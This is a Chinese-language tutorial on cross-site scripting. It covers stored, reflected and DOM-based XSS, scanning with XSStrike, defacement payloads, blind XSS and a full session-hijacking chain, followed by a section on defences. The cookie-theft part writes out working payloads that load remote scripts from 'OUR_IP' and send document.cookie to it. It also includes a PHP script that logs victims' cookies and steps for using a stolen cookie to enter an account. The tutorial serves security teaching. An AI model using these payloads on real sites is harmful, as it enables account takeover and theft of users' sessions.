
> **跨站脚本**（英语：Cross-site scripting，通常简称为：XSS）是一种网站应用程序的安全漏洞攻击，是[代码注入](https://zh.wikipedia.org/wiki/%E4%BB%A3%E7%A2%BC%E6%B3%A8%E5%85%A5 "代码注入")的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了[HTML](https://zh.wikipedia.org/wiki/HTML "HTML")以及用户端[脚本语言](https://zh.wikipedia.org/wiki/%E8%85%B3%E6%9C%AC%E8%AA%9E%E8%A8%80 "脚本语言")。
> 
> **XSS**攻击通常指的是通过利用网页开发时留下的漏洞，通过巧妙的方法注入恶意指令代码到网页，使用户加载并执行攻击者恶意制造的网页程序。这些恶意网页程序通常是[JavaScript](https://zh.wikipedia.org/wiki/JavaScript "JavaScript")，但实际上也可以包括[Java](https://zh.wikipedia.org/wiki/Java "Java")，[VBScript](https://zh.wikipedia.org/wiki/VBScript "VBScript")，[ActiveX](https://zh.wikipedia.org/wiki/ActiveX "ActiveX")，[Flash](https://zh.wikipedia.org/wiki/Flash "Flash")或者甚至是普通的[HTML](https://zh.wikipedia.org/wiki/HTML "HTML")。攻击成功后，攻击者可能得到更高的权限（如执行一些操作）、私密网页内容、[会话](https://zh.wikipedia.org/wiki/%E4%BC%9A%E8%AF%9D "会话")和[cookie](https://zh.wikipedia.org/wiki/Cookie "Cookie")等各种内容。


## XSS 的类型

|  **类型**   |                                    **描述**                                     |
| :-------: | :---------------------------------------------------------------------------: |
|  **存储型**  |             **最严重的 XSS 类型，当用户输入存储在后端数据库中，然后在检索时显示（例如，帖子或评论）时发生**              |
|  **反射型**  |                           **当用户输入被后端服务器处理后显示在页面上**                            |
| **基于DOM** | **另一种非持久性 XSS 类型，用户输入直接显示在浏览器中并完全在客户端处理，而无需到达后端服务器（例如，通过客户端 HTTP 参数或锚标记）时发生** |

## 存储型XSS

如果我们注入的 XSS 有效负载存储在后端数据库中，这意味着我们的 XSS 攻击是持久的，会影响访问该页面的任何用户。

我们可以使用以下基本的 XSS 负载来测试页面是否容易受到 XSS 攻击：

```html
<script>alert(window.origin)</script>
```

我们可以通过点击 `CTRL+U`或右键单击并选择来查看页面源代码，从而进一步确认这一点。

> 许多现代 Web 应用程序使用跨域 IFrame 来处理用户输入，因此即使 Web 表单存在 XSS 漏洞，也不会对主 Web 应用程序造成影响。

由于现代浏览器可能会在特定位置阻止`alert()`JavaScript 函数，因此了解一些其他基本的 XSS 有效载荷可能有助于验证 XSS 的存在。其中一个有效载荷是`<plaintext>`，它会停止渲染其后的 HTML 代码并将其显示为纯文本。另一个有效载荷是 `<script>print()</script>`，它会弹出浏览器打印对话框，而这不太可能被任何浏览器阻止。

要检查有效载荷是否持久化并存储在后端，可以刷新页面，看看是否会再次收到警报。

```html
<script>alert(document.cookie)</script>
```

上面的代码可以打印出`cookie`。

## 反射型XSS

与持久性XSS不同，反射型XSS是暂时的，不会在页面刷新后持续存在。比如有一个ToDo列表网页，输入“Learn”以后，显示消息“Learn is added to your list.”，注意到输出消息与你的输入有关。这时候我们可以尝试输入`alert`载荷，看看是否真的会弹出通知框。如果存在，就会弹出，并且会显示` '' is added to your list.`，这是因为包裹在`js`标签内的内容不会被浏览器渲染。

刷新再次访问时，不会再弹出信息了。

那么，既然非持久，怎么实现攻击呢？我们需要构造一个包含我们`xss payload`的`URL`，如`http://example.com/search?query=<你的恶意代码>`并发送给受害者。他们在浏览器访问时就会自动执行。在这个过程，我们需要去浏览器`F12`的`Network`或者使用`Burp`之类的工具，确定是哪个`HTTP`请求发送了数据到服务器。

## 基于DOM的XSS

这也是一种非持久的XSS。虽然反射型XSS通过 HTTP 请求将输入数据发送到后端服务器，但 DOM XSS 完全通过 JavaScript 在客户端进行处理。当 JavaScript 通过`Document Object Model (DOM)`更改页面源码时，就会触发 DOM XSS 。

一个例子是ToDo列表，输入test以后没有发生HTTP请求，却出现在了页面上。说明这都是客户端本地JS函数处理的。这时候就可能存在基于DOM的XSS。

有时，不允许执行`<script>`标签内的内容，我们可以尝试输入以下代码。这行代码创建了一个新的 HTML 图像对象，该对象有一个`onerror`属性，可以在找不到图像时执行 JavaScript 代码。因此，由于我们提供了一个空的图像链接 ( `""`)，我们的代码应该始终执行

```html
<img src="" onerror=alert(window.origin)>
```

## XSS发现

由于 XSS 漏洞广泛存在，许多工具可以帮助我们检测和识别它们。

几乎所有 Web 应用程序漏洞扫描器（如 Nessus、Burp Pro 或 ZAP）都具有检测所有三种类型 XSS 漏洞的各种功能。这些扫描器通常执行两种类型的扫描：被动扫描，它审查客户端代码以查找潜在的基于 DOM 的漏洞；以及主动扫描，它发送各种类型的载荷，试图通过在页面源代码中注入载荷来触发 XSS。

虽然付费工具在检测 XSS 漏洞方面通常具有更高的准确性，但我们仍然可以找到开源工具来帮助我们识别潜在的 XSS 漏洞。这些工具通常通过识别网页中的输入字段、发送各种类型的 XSS 载荷，然后比较渲染后的页面源代码，查看是否能在其中找到相同的载荷，这可能表明成功进行了 XSS 注入。不过，这并不总是准确的，因为有时即使注入了相同的载荷，由于各种原因，也可能无法成功执行，所以我们必须始终手动验证 XSS 注入。

一些有助于 XSS 发现的常见开源工具包括 XSS Strike、Brute XSS 和 XSSer。我们可以尝试通过 `git clone` 将 XSS Strike 下载到本地：

```bash
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
```

然后，我们可以运行脚本并使用 `-u` 提供一个带有参数的 URL。让我们尝试使用我们之前章节中的**反射型 XSS** 示例：

```bash
python3 xsstrike.py -u 'http://94.237.63.150:58664/?fullname=1&username=2&password=0&email=sss%40sss.com'

        XSStrike v3.1.5                                          
[~] Checking for DOM vulnerabilities 
[+] WAF Status: Offline 
[!] Testing parameter: fullname 
[-] No reflection found 
[!] Testing parameter: username 
[-] No reflection found 
[!] Testing parameter: password 
[-] No reflection found 
[!] Testing parameter: email 
[!] Reflections found: 1 
[~] Analysing reflections 
[~] Generating payloads 
[!] Payloads generated: 3072 
------------------------------------------------------------
[+] Payload: <DETAilS/+/oNPOINtErEnTER%0a=%0a(prompt)``%0dx> 
[!] Efficiency: 100 
[!] Confidence: 10 
[?] Would you like to continue scanning? [y/N] 

```

正如我们所见，该工具从第一个载荷就识别出该参数容易受到 XSS 攻击。

### 手动发现

寻找 XSS 漏洞的最基本方法是手动测试各种 XSS 载荷对给定网页中输入字段的攻击。我们可以在网上找到大量的 XSS 载荷列表，例如 `PayloadAllTheThings` 或 `PayloadBox` 中的列表。然后，逐个测试这些载荷，将每个载荷复制并添加到我们的表单中，看看是否会弹出一个警报框。

注意：XSS 可以注入到 HTML 页面中的任何位置，不仅仅是页面上的输入框，还可以是 HTTP 头部中的值，如 `Cookie `或 `User-Agent`。

载荷中的大多数在Web 应用程序中不起作用，尽管它是最基本的 XSS 漏洞类型。这是因为这些载荷是为各种注入点（如在单引号后注入）编写的，或者旨在规避某些安全措施（如过滤器）。此外，这些载荷利用各种注入向量来执行 `JavaScript` 代码，如基本的 `<script>` 标签、其他 **HTML 属性**如 `<img>`，甚至是 **CSS 样式**属性。这就是为什么我们可以预期这些载荷中的许多在所有测试用例中都不会奏效，因为它们是为特定类型的注入而设计的。

这就是为什么手动复制/粘贴 XSS 载荷效率不高，因为即使 Web 应用程序存在漏洞，可能也需要我们花费一段时间才能找到漏洞，尤其是有许多输入字段需要测试时。因此，编写自己的 Python 脚本来自动化发送这些载荷，然后比较页面源代码以查看载荷如何呈现，可能会更高效。这可以帮助我们在 XSS 工具无法发送和比较载荷的高级情况下进行检测。

### 代码审计

检测 XSS 漏洞最可靠的方法是手动代码审计，这应该涵盖后端和前端代码。如果我们精确地了解输入从到达 Web 浏览器之后是如何处理的，可以编写一个自定义载荷，它应该具有很高的成功率。


## 破坏网页的原本显示内容

我们可以利用注入的 JavaScript 代码（通过 XSS）来让网页呈现出任何我们想要的样子。然而，破坏网站通常只是为了传达一个简单的信息（例如，我们成功入侵了你），所以让被破坏的网页看起来更美观并非主要目的。

通常使用四个 HTML 元素来改变网页的主要外观：

- 背景颜色`document.body.style.background`
- 背景`document.body.background`
- 页面标题`document.title`
- 页面文本`DOM.innerHTML`

我们可以利用其中两个或三个元素向网页写入基本消息，也可以删除元素。

要更改网页背景，可以选择特定颜色或使用图片。由于大多数破坏攻击都使用深色作为背景，因此我们将使用颜色作为背景。为此，我们可以使用以下有效载荷：

```html
<script>document.body.style.background = "#141d2b"</script>
```

我们可以使用任何其他十六进制值，或者使用类似 的命名颜色 `= "black"`。

由于我们利用了存储型 XSS 漏洞，因此该信息在页面刷新后仍会持续存在，并且会显示给访问该页面的任何人。另一个选择是使用以下有效负载将图像设置为背景：


```html
<script>document.body.background = "http://www.example.com/demo.jpg"</script>
```

我们可以使用 JavaScript 属性`document.title`将页面标题更改为我们选择的任何标题：

```html
<script>document.title = 'Hello Hacker'</script>
```

我们可以从页面窗口/选项卡中看到我们的新标题已经取代了之前的标题：

当我们想要更改网页上显示的文本时，可以使用各种 JavaScript 函数来实现。例如，可以 用`innerHTML`属性更改特定 HTML 元素/DOM 的文本：

```javascript
document.getElementById("todo").innerHTML = "New Text"
```

还可以利用 `jQuery` 函数更有效地实现相同的功能，或者在一行中更改多个元素的文本（为此，`jQuery`必须在页面源中导入该库）：

```javascript
$("#todo").html('New Text');
```

这为我们提供了各种选项来自定义网页上的文本，并进行微调以满足我们的需求。然而，由于黑客组织通常只会在网页上留下一条简单的消息，而不会留下任何其他内容，因此我们将使用 更改主页面的整个 HTML 代码`body`，`innerHTML`如下所示：

```javascript
document.getElementsByTagName('body')[0].innerHTML = "New Text"
```

我们可以`body`用 指定元素`document.getElementsByTagName('body')`，通过指定`[0]`，我们选择了第一个`body`元素，该元素应该会更改网页的整个文本。

## 盗窃Cookie

如果能够在受害者的浏览器上执行JavaScript代码，可以收集他们的Cookie并将其发送到自己的服务器。

我们将处理盲XSS漏洞。盲XSS漏洞发生在我们无法访问的页面上触发漏洞时，通常出现在只有特定用户（如管理员）才能访问的表单中。一些潜在例子包括：

- 联系表单
- 评论
- 用户详情
- 支持票据
- HTTP User-Agent头部

例如我们看到一个包含多个字段的用户注册页面，所以我们尝试提交一个测试用户，看看表单如何处理数据。

提交表单后，我们收到以下消息：

> 感谢您的注册。管理员将审核您的注册请求。

这表明我们无法看到我们的输入如何被处理或它在浏览器中的显示方式，因为它只会显示给管理员，在我们无法访问的管理面板中。在正常情况下，我们可以测试每个字段，但是，由于在这种情况下我们无法访问管理员面板，如果我们看不到输出是如何处理的，我们如何检测XSS漏洞呢？

为此，我们可以用：螚向我们的服务器发送HTTP请求的JavaScript负载。如果JavaScript代码被执行，我们将在我们的机器上获得响应，并且知道该页面确实存在漏洞。

但这会带来两个问题：
1. 我们怎么知道哪个特定字段是有漏洞的？因为任何字段都可能执行我们的代码，我们无法知道是哪一个。
2. 我们怎么知道使用什么XSS负载？

在HTML中，我们可以在`<script>`标签内编写JavaScript代码，也可以通过提供URL来包含远程脚本，如下所示：

```html
<script src="http://OUR_IP/script.js"></script>
```

因此，我们可以利用此功能执行托管在攻击机上的远程JavaScript文件。我们可以将请求的脚本名称从script.js更改为我们注入的字段名称，这样当我们在攻击机中收到请求时，可以识别执行脚本的易受攻击的输入字段：

```html
<script src="http://OUR_IP/username"></script>
```

如果我们收到对/username的请求，那么我们就知道username字段容易受到XSS攻击，依此类推。有了这个，我们可以开始测试各种加载远程脚本的XSS负载，看看哪些会向我们发送请求。以下是一些可以从PayloadsAllTheThings使用的示例：

```html
<script src=http://OUR_IP></script>
'><script src=http://OUR_IP></script>
"><script src=http://OUR_IP></script>
javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>
<script>$.getScript("http://OUR_IP")</script>
```

正如我们所见，各种负载以`'>`等注入开始，这可能会也可能不会起作用，取决于我们的输入在后端是如何处理的。如前面在XSS发现部分提到的，如果我们能访问源代码（即在DOM XSS中），就有可能精确地编写成功注入所需的负载。这就是为什么盲XSS在DOM XSS类型的漏洞中有较高的成功率。

在开始发送负载之前，我们需要在攻击机上使用启动监听器：

```bash
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:80
```

现在我们可以逐个测试这些负载，在所有输入字段中使用其中一个，并在我们的IP后面附加字段名称，如前所述：

```html
<script src=http://OUR_IP/fullname></script> #这放在full-name字段中
<script src=http://OUR_IP/username></script> #这放在username字段中
```

提示：我们会注意到电子邮件必须匹配电子邮件格式，即使我们尝试操作HTTP请求参数，因为它在前端和后端都进行了验证。因此，电子邮件字段不易受攻击，我们可以跳过测试它。同样，我们可以跳过密码字段，因为密码通常会被哈希，而不是以明文显示。这有助于我们减少需要测试的潜在脆弱输入字段的数量。

一旦我们找到有效的XSS负载并识别出脆弱的输入字段，我们就可以进行XSS利用并执行会话劫持攻击。

会话劫持攻击与我们在上一节执行的钓鱼攻击非常相似。它需要JavaScript负载向我们发送所需的数据，以及在我们服务器上托管的PHP脚本来抓取和解析传输的数据。

我们可以使用多种JavaScript负载来抓取会话Cookie并将其发送给我们，如PayloadsAllTheThings所示：

```javascript
document.location='http://OUR_IP/index.php?c='+document.cookie;
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

使用这两种负载中的任何一种都应该能发送Cookie，但我们将使用第二种，因为它只是向页面添加了一个图像，可能看起来不太恶意，而第一种则导航到我们的Cookie抓取PHP页面，可能看起来很可疑。

我们可以将这些JavaScript负载之一写入`script.js`：

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie
```

现在，我们可以更改之前找到的XSS负载中的URL，以使用`script.js`

```html
<script src=http://OUR_IP/script.js></script>
```

在PHP服务器运行的情况下，我们现在可以使用代码作为XSS负载的一部分，将其发送到易受攻击的输入字段，我们应该会收到带有Cookie值的调用。但是，如果有许多Cookie，我们可能不知道哪个Cookie值属于哪个Cookie标头。因此，我们可以编写一个PHP脚本，用新行分隔它们并将它们写入文件。在这种情况下，即使多个受害者触发XSS漏洞，我们也会获得所有受害者按顺序排列的Cookie。

我们可以将以下PHP脚本保存为index.php，并重新运行PHP服务器：

```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

现在，我们等待受害者访问易受攻击的页面并查看我们的XSS负载。一旦他们这样做，我们将在服务器上收到两个请求，一个用于script.js，这反过来会带着Cookie值发出另一个请求：

```
10.10.10.10:52798 [200]: /script.js
10.10.10.10:52799 [200]: /index.php?c=cookie=f904f93c949d19d870911bf8b05fe7b2
```

如前所述，我们直接在终端获取Cookie值。但是，由于我们准备了PHP脚本，我们还会获得cookies.txt文件，其中有清晰的Cookie日志：

```
Victim IP: 10.10.10.1 | Cookie: cookie=f904f93c949d19d870911bf8b05fe7b2
```

最后，我们可以在login.php页面上使用这个Cookie来访问受害者的账户。为此，一旦我们导航到/hijacking/login.php，我们可以在Firefox中按Shift+F9显示开发者工具中的存储栏。然后，我们可以点击右上角的+按钮并添加我们的Cookie，其中Name是=之前的部分，Value是我们窃取的Cookie中=之后的部分

## 防御

> 预防 XSS 漏洞最重要的一点是在前端和后端进行适当的输入清理和验证。

比如我们看到如果电子邮件格式无效，Web 应用程序将不允许我们提交表单。这是通过以下 JavaScript 代码实现的：

```javascript
function validateEmail(email) {
    const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
    return re.test($("#login input[name=email]").val());
}
```

可以看到，这段代码正在测试`email`输入字段并返回`true`、`false`，显示是否符合电子邮件格式的正则表达式验证。

除了输入验证之外，我们还应始终确保不允许任何包含 JavaScript 代码的输入，方法是转义所有特殊字符。为此，我们可以使用[DOMPurify](https://github.com/cure53/DOMPurify) JavaScript 库，如下所示：

```javascript
<script type="text/javascript" src="dist/purify.min.js"></script>
let clean = DOMPurify.sanitize( dirty );
```

这将用反斜杠转义任何特殊字符`\`，这有助于确保用户不会发送任何带有特殊字符的输入（如 JavaScript 代码），从而可以防止 DOM XSS 等漏洞。

应该始终确保永远不会在某些 HTML 标签内直接使用用户输入，例如：

1. JavaScript 代码`<script></script>`
2. CSS 样式代码`<style></style>`
3. 标签/属性字段`<div name='INPUT'></div>`
4. HTML 注释`<!-- -->`

如果用户输入符合上述任何示例，则可能会注入恶意 JavaScript 代码，从而可能导致 XSS 漏洞。此外，我们还应避免使用允许更改 HTML 字段原始文本的 JavaScript 函数，例如：

- `DOM.innerHTML`
- `DOM.outerHTML`
- `document.write()`
- `document.writeln()`
- `document.domain`

以及以下 jQuery 函数：

- `html()`
- `parseHTML()`
- `add()`
- `append()`
- `prepend()`
- `after()`
- `insertAfter()`
- `before()`
- `insertBefore()`
- `replaceAll()`
- `replaceWith()`

由于这些函数将原始文本写入 HTML 代码，因此如果任何用户输入进入其中，则可能包含恶意 JavaScript 代码，从而导致 XSS 漏洞。

我们还应该确保在后端采取措施来防范存储型和反射型 XSS 漏洞。

后端的输入验证与前端非常相似，它使用正则表达式或库函数来确保输入字段符合预期。如果不匹配，后端服务器将拒绝输入，并且不会显示。PHP 后端电子邮件验证的示例如下：

```php
if (filter_var($_GET['email'], FILTER_VALIDATE_EMAIL)) {
    // do task
} else {
    // reject input - do not display it
}
```

在输入过滤方面，后端起着至关重要的作用，因为前端的输入过滤很容易被通过发送自定义`GET`或`POST`请求绕过。幸运的是，各种后端语言都有非常强大的库，可以正确地过滤任何用户输入，从而确保不会发生注入。

例如，对于 PHP 后端，我们可以使用该`addslashes`函数通过使用反斜杠转义特殊字符来清理用户输入：

```php
addslashes($_GET['email'])
```

无论如何，直接用户输入（例如`$_GET['email']`）都不应直接显示在页面上，因为这可能导致 XSS 漏洞。

```javascript
import DOMPurify from 'dompurify';
var clean = DOMPurify.sanitize(dirty);
```

对于 PHP 后端，我们可以使用`htmlspecialchars`或`htmlentities`函数，它们会将某些特殊字符编码到相应的 HTML 代码中（例如`<`->`&lt;`），这样浏览器就可以正确显示它们，而不会导致任何类型的注入：

```php
htmlentities($_GET['email']);
```

对于 NodeJS 后端，我们可以使用任何执行 HTML 编码的库，例如`html-entities`，如下所示：

```javascript
import encode from 'html-entities';
encode('<'); // -> '&lt;'
```

除上述内容外，某些后端 Web 服务器配置可能有助于防止 XSS 攻击，例如：

- 在整个域中使用 HTTPS。
- 使用 XSS 预防标头。
- 使用适合页面的 Content-Type，例如`X-Content-Type-Options=nosniff`。
- 使用`Content-Security-Policy`选项，例如`script-src 'self'`，仅允许本地托管的脚本。
- 使用`HttpOnly`和`Secure`cookie 标志来阻止 JavaScript 读取 cookie 并仅通过 HTTPS 传输它们。

除上述之外，拥有一个好的`Web Application Firewall (WAF)`XSS 防护系统可以显著降低 XSS 攻击的风险，因为它会自动检测通过 HTTP 请求的任何类型的注入，并自动拒绝此类请求。此外，一些框架提供了内置的 XSS 防护，例如[ASP.NET](https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-7.0)。